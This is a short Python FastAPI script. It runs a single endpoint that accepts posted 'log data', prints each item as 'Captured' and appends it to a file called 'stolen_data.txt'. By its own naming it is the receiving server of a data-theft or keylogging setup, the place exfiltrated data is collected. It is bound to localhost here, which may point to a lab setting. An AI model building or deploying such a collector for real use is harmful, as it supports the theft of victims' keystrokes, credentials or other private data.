from fastapi import FastAPI, Form
import uvicorn

app = FastAPI()

@app.post("/receive_logs")
def receive_logs(log_data: str = Form(...)):
    print(f"Captured: {log_data}")
    with open("stolen_data.txt", "a") as f:
        f.write(log_data + "\n")
    return {"status": "ok"}

if __name__ == "__main__":
    uvicorn.run(app, host="127.0.0.1", port=8000)
